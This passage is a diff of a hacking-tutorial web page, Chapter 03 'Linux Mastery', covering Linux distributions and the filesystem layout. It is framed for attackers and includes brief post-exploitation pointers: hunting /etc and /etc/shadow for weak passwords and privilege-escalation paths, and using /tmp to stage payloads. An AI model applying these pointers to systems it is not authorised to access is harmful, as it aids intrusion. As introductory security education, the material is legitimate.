@@ -3,1119 +3,2280 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ch03: Command Line Mastery - NullSector</title>
-    <link rel="stylesheet" href="styles.css">
-    <link rel="icon" href="favicon.ico">
-    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <title>Chapter 03: Linux Mastery - NullSector</title>
+    <link rel="icon" type="image/svg+xml" href="logo.svg">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #000; --bg2: #0a0a0a; --bg3: #111;
+            --text: #fff; --text2: #888; --text3: #555;
+            --border: rgba(255,255,255,0.1);
+        }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); line-height: 1.7; overflow-x: hidden; }
+        .header { position: fixed; top: 0; left: 0; right: 0; height: 70px; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); z-index: 1000; display: flex; align-items: center; padding: 0 2rem; }
+        .header-content { width: 100%; max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+        .brand { display: flex; align-items: center; gap: 0.75rem; text-decoration: none; color: var(--text); font-weight: 700; font-size: 1.25rem; }
+        .nav { display: flex; gap: 2rem; }
+        .nav a { color: var(--text2); text-decoration: none; font-size: 0.95rem; font-weight: 500; transition: color 0.3s; }
+        .nav a:hover { color: var(--text); }
+        .sidebar { position: fixed; left: 0; top: 70px; width: 280px; height: calc(100vh - 70px); background: var(--bg2); border-right: 1px solid var(--border); overflow-y: auto; padding: 2rem 0; z-index: 100; }
+        .sidebar::-webkit-scrollbar { width: 6px; }
+        .sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+        .sidebar-section { padding: 0 1.5rem; margin-bottom: 2rem; }
+        .sidebar-title { font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--text3); margin-bottom: 1rem; }
+        .sidebar-link { display: block; color: var(--text2); text-decoration: none; padding: 0.6rem 1rem; margin: 0.25rem 0; border-radius: 6px; font-size: 0.9rem; transition: all 0.3s; }
+        .sidebar-link:hover { background: rgba(255,255,255,0.05); color: var(--text); transform: translateX(4px); }
+        .sidebar-link.active { background: rgba(255,255,255,0.1); color: var(--text); font-weight: 600; }
+        .main { margin-left: 280px; margin-top: 70px; padding: 4rem 3rem; max-width: 1100px; }
+        .page-header { margin-bottom: 4rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border); }
+        .chapter-label { font-size: 0.875rem; font-weight: 600; text-transform: uppercase; letter-spacing: 2px; color: var(--text3); margin-bottom: 1rem; }
+        .page-title { font-size: 3.5rem; font-weight: 800; line-height: 1.2; margin-bottom: 1rem; letter-spacing: -1px; }
+        .page-subtitle { font-size: 1.25rem; color: var(--text2); font-weight: 400; line-height: 1.6; }
+        .section { margin-bottom: 6rem; scroll-margin-top: 100px; }
+        .section-title { font-size: 2.25rem; font-weight: 700; margin-bottom: 1.5rem; }
+        .section-intro { font-size: 1.125rem; color: var(--text2); margin-bottom: 2rem; line-height: 1.8; }
+        h3 { font-size: 1.75rem; font-weight: 600; margin: 3rem 0 1.5rem; }
+        p { font-size: 1.0625rem; line-height: 1.8; margin-bottom: 1.5rem; }
+        .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 2rem 0; }
+        .card { background: var(--bg3); border: 1px solid var(--border); border-radius: 12px; padding: 2rem; transition: all 0.3s; }
+        .card:hover { transform: translateY(-4px); border-color: rgba(255,255,255,0.2); }
+        .card h4 { font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; }
+        .card p { color: var(--text2); font-size: 0.9375rem; }
+        .info-box { background: var(--bg3); border-left: 3px solid var(--text); padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; }
+        .info-box h4 { font-weight: 600; margin-bottom: 0.75rem; }
+        .info-box p { color: var(--text2); }
+        .warning-box { background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-left: 3px solid var(--text2); padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; }
+        .code { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.875rem; line-height: 1.7; white-space: pre; }
+        .inline-code { background: rgba(255,255,255,0.1); padding: 0.2rem 0.5rem; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.875em; }
+        .metaphor-box { background: rgba(255,255,255,0.03); border-left: 4px solid var(--text); padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; position: relative; }
+        .metaphor-box::before { content: "💡"; position: absolute; top: 1rem; right: 1rem; font-size: 1.5rem; }
+        ul, ol { margin: 1.5rem 0; padding-left: 2rem; }
+        li { margin: 0.75rem 0; color: var(--text2); }
+        table { width: 100%; border-collapse: collapse; margin: 2rem 0; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+        th, td { padding: 1rem; text-align: left; border-bottom: 1px solid var(--border); }
+        th { background: var(--bg2); font-weight: 600; font-size: 0.875rem; text-transform: uppercase; }
+        td { color: var(--text2); font-size: 0.9375rem; }
+        .progress { position: fixed; top: 70px; left: 0; height: 3px; background: linear-gradient(90deg, var(--text) 0%, var(--text2) 100%); transition: width 0.1s; z-index: 1001; }
+        @media (max-width: 1024px) { .sidebar { transform: translateX(-100%); } .main { margin-left: 0; padding: 3rem 2rem; } .page-title { font-size: 2.5rem; } }
+    </style>
 </head>
 <body>
-    <div class="stars"></div>
-    <div class="twinkling"></div>
-    
-    <nav class="navbar">
-        <div class="nav-container">
-            <div class="nav-brand">
-                <a href="index.html" style="display: flex; align-items: center; text-decoration: none; color: inherit;">
-                    <img src="logo.svg" alt="NullSector Logo" class="logo">
-                    <span class="brand-text">NullSector</span>
-                </a>
-            </div>
-            <div class="nav-links">
-                <a href="roadmap-hacking.html" class="nav-link active">Hacking</a>
-                <a href="roadmap-programming.html" class="nav-link ">Programming</a>
-                <a href="resources.html" class="nav-link">Resources</a>
-                <a href="faq.html" class="nav-link">FAQ</a>
-                <a href="https://discord.gg/Tz9Y3wea32" target="_blank" class="nav-link">Discord</a>
-            
-                                
-                <div id="userProfile" style="display: none; align-items: center; gap: 0.75rem;">
-                    <div style="display: flex; align-items: center; gap: 0.5rem;">
-                        <img id="userAvatar" style="width: 36px; height: 36px; border-radius: 50%; border: 2px solid var(--primary-color); cursor: pointer; transition: transform 0.2s;" onmouseover="this.style.transform='scale(1.1)'" onmouseout="this.style.transform='scale(1)'" title="" />
-                        <span id="userName" style="color: var(--text-primary); font-weight: 500; font-size: 0.95rem; cursor: default;"></span>
-                    </div>
-                    <button id="logoutButton" class="nav-link" style="background: rgba(255, 95, 87, 0.1); border: 1px solid #ff5f57; padding: 0.4rem 1rem; border-radius: 6px; font-weight: 500; cursor: pointer; color: #ff5f57; transition: all 0.2s;" onmouseover="this.style.background='rgba(255, 95, 87, 0.2)'" onmouseout="this.style.background='rgba(255, 95, 87, 0.1)'">Logout</button>
-                </div>
-            </div>
+    <div class="progress" id="progress"></div>
+    <header class="header">
+        <div class="header-content">
+            <a href="index.html" class="brand">
+                <img src="logo.svg" alt="NullSector" width="36" height="36">
+                <span>NullSector</span>
+            </a>
+            <nav class="nav">
+                <a href="roadmap-hacking.html">Hacking</a>
+                <a href="roadmap-programming.html">Programming</a>
+                <a href="index.html">Home</a>
+            </nav>
         </div>
-    </nav>
+    </header>
 
-    <section class="content-page">
-        <div class="content-container">
-            <div class="breadcrumb">
-                <a href="roadmap-hacking.html">Hacking Roadmap</a> / <span>Chapter 03</span>
-            </div>
+    <aside class="sidebar">
+        <div class="sidebar-section">
+            <div class="sidebar-title">On This Page</div>
+            <a href="#why-linux" class="sidebar-link">Why Linux for Hacking</a>
+            <a href="#philosophy" class="sidebar-link">Linux Philosophy</a>
+            <a href="#filesystem" class="sidebar-link">Filesystem Hierarchy</a>
+            <a href="#terminal" class="sidebar-link">Terminal Mastery</a>
+            <a href="#permissions" class="sidebar-link">Permissions Deep Dive</a>
+            <a href="#processes" class="sidebar-link">Process Management</a>
+            <a href="#networking" class="sidebar-link">Linux Networking</a>
+            <a href="#scripting" class="sidebar-link">Bash Scripting</a>
+        </div>
+        <div class="sidebar-section">
+            <div class="sidebar-title">Navigation</div>
+            <a href="hacking-ch04.html" class="sidebar-link">Next: Chapter 04 →</a>
+            <a href="hacking-ch02.html" class="sidebar-link">← Previous: Chapter 02</a>
+            <a href="roadmap-hacking.html" class="sidebar-link">Back to Roadmap</a>
+        </div>
+    </aside>
+
+    <main class="main">
+        <div class="page-header">
+            <div class="chapter-label">Chapter 03</div>
+            <h1 class="page-title">Linux Mastery</h1>
+            <p class="page-subtitle">The complete guide to mastering Linux - the operating system that powers 96.3% of the world's top servers, runs on every Android phone, and is the essential tool for every hacker. This isn't optional knowledge - it's mandatory.</p>
+        </div>
+
+        <section class="section">
+            <p>If you want to be a hacker, you MUST know Linux. This isn't an opinion - it's a fact. Every penetration testing tool, every exploit framework, every security tool worth using runs on Linux. Windows hackers are like chefs who don't know how to use knives - technically possible, but you're severely handicapped.</p>
             
-            <div class="roadmap-section">
-                <div class="roadmap-number">03</div>
-                <h1 class="page-title">Chapter 03: Linux Mastery</h1>
-                <p class="page-subtitle">Complete Linux Expertise — From Distros to System Hardening</p>
+            <p>Here's a reality check: when you break into a server, there's a 96.3% chance it's running Linux. When you're pivoting through a network, most devices speak Linux. When you're analyzing malware, reverse engineering binaries, or crafting exploits - you're doing it on Linux. This isn't about which OS is "better" - it's about using the right tool for the job.</p>
 
-                <!-- Introduction -->
-                <div style="background: linear-gradient(135deg, rgba(0,255,136,0.1) 0%, rgba(0,204,255,0.1) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border-left: 5px solid var(--primary-color);">
-                    <h2 style="color: var(--primary-color); font-size: 1.8rem; margin-bottom: 1.5rem;">🐧 Welcome to the Linux Universe</h2>
-                    <p style="font-size: 1.15rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Linux isn't just an operating system—it's the <strong>backbone of the entire cybersecurity world</strong>. From hacking labs to production servers, from bug bounty targets to security research platforms, Linux is <em>everywhere</em>.
-                    </p>
-                    <p style="font-size: 1.15rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Think of Linux mastery like learning to navigate a vast city where every street leads to a different capability. At first, the terminal feels intimidating—just a blinking cursor waiting for input. But soon, you'll realize this "cursor" is your direct hotline to the machine's brain. No middle layers, no hand-holding GUI—just pure, unfiltered control.
-                    </p>
-                    <p style="font-size: 1.15rem; line-height: 1.8;">
-                        In this chapter, we'll transform you from a Linux tourist into a <strong>Linux native</strong>. You'll understand the file system like you know your own home, manage permissions like a security guard with master keys, and automate tasks like a conductor orchestrating a symphony.
-                    </p>
+            <p>This chapter will take you from zero to Linux proficiency. We'll go deep - not just "how to run commands" but WHY things work the way they do. By the end, you'll understand the system deeply enough to exploit it.</p>
+
+            <div class="info-box">
+                <h4>Why This Chapter is Critical</h4>
+                <p>The numbers don't lie:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>96.3%</strong> of the top 1 million web servers run Linux</li>
+                    <li><strong>100%</strong> of Android phones run a Linux kernel</li>
+                    <li><strong>90%+</strong> of cloud infrastructure is Linux</li>
+                    <li><strong>Most</strong> IoT devices, routers, and embedded systems run Linux</li>
+                    <li><strong>All</strong> major supercomputers run Linux</li>
+                </ul>
+                <p style="margin-top: 1rem;">If you can't navigate Linux, you can't hack the modern world. Period.</p>
+            </div>
+
+            <div class="metaphor-box">
+                <h4>🎮 The Video Game Analogy</h4>
+                <p>Think of operating systems like game difficulty levels:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Windows:</strong> "Easy Mode" - Designed to hide complexity, protect you from yourself, limit what you can do</li>
+                    <li><strong>macOS:</strong> "Medium Mode" - Unix underneath, but still tries to hold your hand</li>
+                    <li><strong>Linux:</strong> "Expert Mode" - Nothing hidden, nothing restricted, you have complete control</li>
+                </ul>
+                <p style="margin-top: 1rem;">Hackers don't play on Easy Mode. We need to see everything, control everything, and understand everything. Linux gives us that power.</p>
+            </div>
+
+            <h3>What You'll Learn in This Chapter</h3>
+            <div class="card-grid">
+                <div class="card">
+                    <h4>🐧 Linux Philosophy</h4>
+                    <p>Why Linux works the way it does. Understanding the "why" makes the "how" trivial.</p>
                 </div>
-
-                <!-- Topic 1: Linux Distributions -->
-                <div style="background: linear-gradient(135deg, rgba(138,43,226,0.15) 0%, rgba(75,0,130,0.15) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border: 2px solid rgba(138,43,226,0.3);">
-                    <h2 style="color: #8a2be2; font-size: 1.8rem; margin-bottom: 1.5rem;">🌐 Topic 1: Linux Distributions — Choosing Your Weapon</h2>
-                    
-                    <h3 style="color: #9370db; font-size: 1.4rem; margin: 2rem 0 1rem 0;">What ARE Linux Distributions?</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Imagine Linux as a <strong>car engine</strong> (the kernel). A distribution is the entire car—complete with seats, dashboard, stereo system, and paint job. Different manufacturers (distro maintainers) take the same engine and build completely different vehicles for different purposes.
-                    </p>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        All Linux distros share the same core (the Linux kernel written by Linus Torvalds), but they differ in:
-                    </p>
-                    <ul style="font-size: 1.05rem; line-height: 1.9; margin: 1rem 0 1.5rem 2rem;">
-                        <li><strong>Package managers:</strong> How you install software (apt, yum, pacman)</li>
-                        <li><strong>Default software:</strong> Pre-installed tools and desktop environments</li>
-                        <li><strong>Release cycles:</strong> How often updates ship (rolling vs fixed)</li>
-                        <li><strong>Philosophy:</strong> Stability vs bleeding-edge features</li>
-                        <li><strong>Target audience:</strong> Beginners, hackers, servers, developers</li>
-                    </ul>
-
-                    <h3 style="color: #9370db; font-size: 1.4rem; margin: 2rem 0 1rem 0;">The Big Families</h3>
-                    
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #00ff88;">
-                        <h4 style="color: #00ff88; margin-bottom: 1rem;">🟢 Debian Family (apt/dpkg)</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Ubuntu:</strong> The beginner-friendly gateway drug to Linux. Massive community, tons of tutorials, hardware support out of the box. Perfect for learning basics before jumping into hacking-specific distros.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Debian:</strong> Ubuntu's parent. More stable, more minimal, less hand-holding. Favored for servers where you want rock-solid reliability.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>Kali Linux:</strong> The <em>legendary</em> penetration testing distro. Pre-loaded with 600+ security tools. Built on Debian, optimized for hackers. This is where you'll live once you master the basics.
-                        </p>
-                        <div style="background: rgba(0,255,136,0.1); padding: 1.5rem; border-radius: 10px; margin-top: 1rem;">
-                            <p style="font-size: 1rem; line-height: 1.7; margin: 0;">
-                                <strong>Package Manager:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">apt</code> (Advanced Package Tool)<br>
-                                <strong>Example:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">sudo apt update && sudo apt install nmap</code>
-                            </p>
-                        </div>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #ff6b6b;">
-                        <h4 style="color: #ff6b6b; margin-bottom: 1rem;">🔴 Red Hat Family (yum/dnf)</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Fedora:</strong> Bleeding-edge features, sponsored by Red Hat. Great for developers who want the latest toys. Updates frequently.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>RHEL (Red Hat Enterprise Linux):</strong> Enterprise-grade, expensive, ultra-stable. Used in corporate environments.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>CentOS:</strong> Free version of RHEL. Popular for servers and production environments.
-                        </p>
-                        <div style="background: rgba(255,107,107,0.1); padding: 1.5rem; border-radius: 10px; margin-top: 1rem;">
-                            <p style="font-size: 1rem; line-height: 1.7; margin: 0;">
-                                <strong>Package Manager:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">dnf</code> (or older <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">yum</code>)<br>
-                                <strong>Example:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">sudo dnf install wireshark</code>
-                            </p>
-                        </div>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #00ccff;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">🔵 Arch Family (pacman)</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Arch Linux:</strong> The DIY builder's dream. You construct your system from scratch. Rolling release means always-fresh packages. Steep learning curve but incredible control.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Manjaro:</strong> Arch made easy. Pre-configured for usability while keeping Arch's rolling release model.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>BlackArch:</strong> Arch for penetration testing. Similar to Kali but Arch-based. Over 2,800+ security tools.
-                        </p>
-                        <div style="background: rgba(0,204,255,0.1); padding: 1.5rem; border-radius: 10px; margin-top: 1rem;">
-                            <p style="font-size: 1rem; line-height: 1.7; margin: 0;">
-                                <strong>Package Manager:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">pacman</code><br>
-                                <strong>Example:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">sudo pacman -S metasploit</code>
-                            </p>
-                        </div>
-                    </div>
-
-                    <h3 style="color: #9370db; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Which Distro Should YOU Use?</h3>
-                    <div style="background: rgba(138,43,226,0.1); padding: 2rem; border-radius: 15px; margin: 1.5rem 0;">
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Total beginner?</strong> Start with <strong>Ubuntu</strong> or <strong>Linux Mint</strong>. Get comfortable with terminals, file systems, and package management.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Ready for hacking?</strong> Transition to <strong>Kali Linux</strong> or <strong>Parrot OS</strong>. Pre-loaded tools save you hours of setup.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Want to understand everything?</strong> Try <strong>Arch</strong>. You'll learn more in one Arch installation than months of using pre-built distros.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>Pro tip:</strong> Use virtual machines (VirtualBox, VMware) to test multiple distros without commitment. Run Kali in a VM while keeping your main OS intact.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(255,200,0,0.15); padding: 1.5rem; border-radius: 10px; margin: 2rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 0.5rem;">🔥 Why This Matters for Hacking</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin: 0;">
-                            Penetration testing requires specialized tools (Burp Suite, Metasploit, Aircrack-ng, SQLmap). Hacking distros like Kali come with these pre-installed and pre-configured. Trying to manually install 600+ tools on Windows or macOS? Good luck—you'll spend weeks troubleshooting dependencies. With Kali, <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ccff;">apt install</code> and you're ready to exploit.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,204,255,0.1); padding: 1.5rem; border-radius: 10px; margin: 2rem 0;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">🎯 Quick Check</h4>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li>What's the difference between a kernel and a distribution?</li>
-                            <li>Which package manager does Kali Linux use?</li>
-                            <li>Name one advantage of rolling release distros like Arch.</li>
-                            <li>Why would a hacker choose Kali over Ubuntu?</li>
-                        </ul>
-                    </div>
+                <div class="card">
+                    <h4>📁 Filesystem Mastery</h4>
+                    <p>Where everything lives, what every directory means, and where to find the good stuff.</p>
                 </div>
-
-                <!-- Topic 2: File System Hierarchy -->
-                <div style="background: linear-gradient(135deg, rgba(0,204,255,0.15) 0%, rgba(0,153,204,0.15) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border: 2px solid rgba(0,204,255,0.3);">
-                    <h2 style="color: #00ccff; font-size: 1.8rem; margin-bottom: 1.5rem;">📂 Topic 2: Linux File System Hierarchy — The Directory Structure Blueprint</h2>
-                    
-                    <h3 style="color: #33d4ff; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Everything Starts at Root (/)</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        On Windows, you have drives: <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">C:\</code>, <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">D:\</code>, etc. On Linux, there's only <strong>one root</strong>: <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ff88;">/</code>
-                    </p>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Think of <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px; color: #00ff88;">/</code> as the <strong>foundation of a building</strong>. Every directory branches off from here. No matter how many hard drives you plug in, they all mount somewhere under this single root.
-                    </p>
-
-                    <h3 style="color: #33d4ff; font-size: 1.4rem; margin: 2rem 0 1rem 0;">The Sacred Directories</h3>
-                    
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #00ff88;">
-                        <h4 style="color: #00ff88; margin-bottom: 1rem;"><code>/bin</code> — Essential Binaries</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            Contains <strong>fundamental commands</strong> needed to boot and run the system. Commands like <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">ls</code>, <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">cat</code>, <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">cp</code>, <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">mv</code>, <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">bash</code> live here.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>Hacker relevance:</strong> When you're in a minimal shell after exploiting a system, <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/bin</code> commands will be your lifeline.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #ff6b6b;">
-                        <h4 style="color: #ff6b6b; margin-bottom: 1rem;"><code>/etc</code> — Configuration Files</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            The <strong>system's brain</strong>. Every piece of software stores its configuration here. Network settings, user passwords (hashed), startup scripts, firewall rules.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Key files:</strong>
-                        </p>
-                        <ul style="font-size: 1rem; line-height: 1.9; margin: 0 0 1rem 2rem;">
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/etc/passwd</code> — User account info</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/etc/shadow</code> — Password hashes (requires root)</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/etc/hosts</code> — DNS mappings</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/etc/ssh/sshd_config</code> — SSH server settings</li>
-                        </ul>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>Hacker relevance:</strong> After gaining access, <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/etc</code> is where you hunt for misconfigurations, weak passwords, and privilege escalation paths.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 1rem;"><code>/home</code> — User Directories</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            Each user gets a personal folder here: <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/home/username</code>. This is where documents, downloads, and personal configs live.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>Shortcut:</strong> <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">~</code> (tilde) always refers to <em>your</em> home directory. <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">cd ~</code> takes you home instantly.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #8a2be2;">
-                        <h4 style="color: #8a2be2; margin-bottom: 1rem;"><code>/var</code> — Variable Data</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            Data that <strong>changes constantly</strong>: logs, mail queues, databases, web server content.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Critical subdirectories:</strong>
-                        </p>
-                        <ul style="font-size: 1rem; line-height: 1.9; margin: 0 0 1rem 2rem;">
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/var/log</code> — System logs (auth.log, syslog, apache logs)</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/var/www</code> — Web server root (nginx/apache)</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/var/tmp</code> — Temp files that persist across reboots</li>
-                        </ul>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>Hacker relevance:</strong> Logs in <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/var/log</code> reveal attack traces. Web roots often contain upload vulns. Always check here post-exploitation.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #ff1744;">
-                        <h4 style="color: #ff1744; margin-bottom: 1rem;"><code>/tmp</code> — Temporary Files</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            A <strong>free-for-all</strong> directory where anyone can write. Cleared on reboot. Often world-writable.
-                        </p>
-                        <p style="font-size: 1.05rem; line-height: 1.8;">
-                            <strong>Hacker relevance:</strong> Perfect place to drop payloads, compile exploits, or stage files. But defenders know this—expect scrutiny.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #00ccff;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;"><code>/usr</code> — User Programs</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1rem;">
-                            Contains <strong>most user applications</strong> and utilities. Despite the name, this isn't user-specific—it's shared system-wide.
-                        </p>
-                        <ul style="font-size: 1rem; line-height: 1.9; margin: 0 0 1rem 2rem;">
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/usr/bin</code> — Non-essential commands (python, gcc, nmap)</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/usr/sbin</code> — System admin tools</li>
-                            <li><code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/usr/local</code> — Manually compiled software</li>
-                        </ul>
-                    </div>
-
-                    <div style="background: rgba(0,0,0,0.3); padding: 2rem; border-radius: 15px; margin: 1.5rem 0; border-left: 4px solid #00ff88;">
